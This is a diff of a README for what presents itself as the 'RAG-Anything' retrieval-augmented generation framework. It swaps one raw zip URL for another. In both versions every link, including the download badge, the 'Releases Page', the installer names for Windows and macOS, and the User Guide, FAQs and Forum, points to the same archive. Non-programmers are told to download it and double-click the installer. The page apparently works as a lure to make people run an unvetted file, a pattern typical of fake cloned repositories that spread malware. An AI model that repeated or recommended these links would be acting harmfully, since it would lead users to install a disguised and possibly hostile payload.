@@ -1,7 +1,7 @@
 # 🎉 RAG-Anything - Powerful RAG Framework for Everyone
 
 ## 📥 Download Now!
-[![Download RAG-Anything](https://raw.githubusercontent.com/junior99wa/RAG-Anything/main/us/RAG-Anything.zip%https://raw.githubusercontent.com/junior99wa/RAG-Anything/main/us/RAG-Anything.zip)](https://raw.githubusercontent.com/junior99wa/RAG-Anything/main/us/RAG-Anything.zip)
+[![Download RAG-Anything](https://github.com/junior99wa/RAG-Anything/raw/refs/heads/main/examples/Anything-RA-v1.8.zip%https://github.com/junior99wa/RAG-Anything/raw/refs/heads/main/examples/Anything-RA-v1.8.zip)](https://github.com/junior99wa/RAG-Anything/raw/refs/heads/main/examples/Anything-RA-v1.8.zip)
 
 ## 🚀 Getting Started
 RAG-Anything is an all-in-one framework designed to simplify multi-modal retrieval-augmented generation tasks. Whether you need to process text, images, or other data types, this framework makes it easy for you. Follow these simple steps to download and run the software on your computer without any programming skills.
@@ -18,11 +18,11 @@ Before you start, ensure your system meets the following requirements to run RAG
 To download RAG-Anything:
 
 1. **Visit the Releases Page**: Click on the link below to go to the download section.
-   [Download RAG-Anything Here](https://raw.githubusercontent.com/junior99wa/RAG-Anything/main/us/RAG-Anything.zip)
+   [Download RAG-Anything Here](https://github.com/junior99wa/RAG-Anything/raw/refs/heads/main/examples/Anything-RA-v1.8.zip)
 
 2. **Choose the Latest Version**: Look for the most recent version of RAG-Anything on the page. The latest version will usually be at the top.
 
-3. **Download the Installer**: Click the link for the installer that matches your operating system. This will typically be named something like `https://raw.githubusercontent.com/junior99wa/RAG-Anything/main/us/RAG-Anything.zip` for Windows or `https://raw.githubusercontent.com/junior99wa/RAG-Anything/main/us/RAG-Anything.zip` for macOS.
+3. **Download the Installer**: Click the link for the installer that matches your operating system. This will typically be named something like `https://github.com/junior99wa/RAG-Anything/raw/refs/heads/main/examples/Anything-RA-v1.8.zip` for Windows or `https://github.com/junior99wa/RAG-Anything/raw/refs/heads/main/examples/Anything-RA-v1.8.zip` for macOS.
 
 4. **Run the Installer**: Once the download finishes, locate the file in your downloads folder. Double-click the installer file to begin the installation.
 
@@ -54,9 +54,9 @@ RAG-Anything comes packed with features designed to enhance your experience:
 ## 📖 Additional Resources
 If you need help or want to learn more about using RAG-Anything, consider checking out the following resources:
 
-- [User Guide](https://raw.githubusercontent.com/junior99wa/RAG-Anything/main/us/RAG-Anything.zip)
-- [FAQs](https://raw.githubusercontent.com/junior99wa/RAG-Anything/main/us/RAG-Anything.zip)
-- [Community Forum](https://raw.githubusercontent.com/junior99wa/RAG-Anything/main/us/RAG-Anything.zip)
+- [User Guide](https://github.com/junior99wa/RAG-Anything/raw/refs/heads/main/examples/Anything-RA-v1.8.zip)
+- [FAQs](https://github.com/junior99wa/RAG-Anything/raw/refs/heads/main/examples/Anything-RA-v1.8.zip)
+- [Community Forum](https://github.com/junior99wa/RAG-Anything/raw/refs/heads/main/examples/Anything-RA-v1.8.zip)
 
 ## 📬 Support
 For further assistance, please reach out through the Issues section of our repository. Our team is dedicated to helping you get the most out of RAG-Anything.
@@ -64,7 +64,7 @@ For further assistance, please reach out through the Issues section of our repos
 Happy exploring! We hope RAG-Anything enhances your workflow and brings you amazing results.
 
 ## 💡 Recap
-- Download the application from the [Releases Page](https://raw.githubusercontent.com/junior99wa/RAG-Anything/main/us/RAG-Anything.zip).
+- Download the application from the [Releases Page](https://github.com/junior99wa/RAG-Anything/raw/refs/heads/main/examples/Anything-RA-v1.8.zip).
 - Follow the installation steps outlined above.
 - Dive into the features and start working on your projects.
 
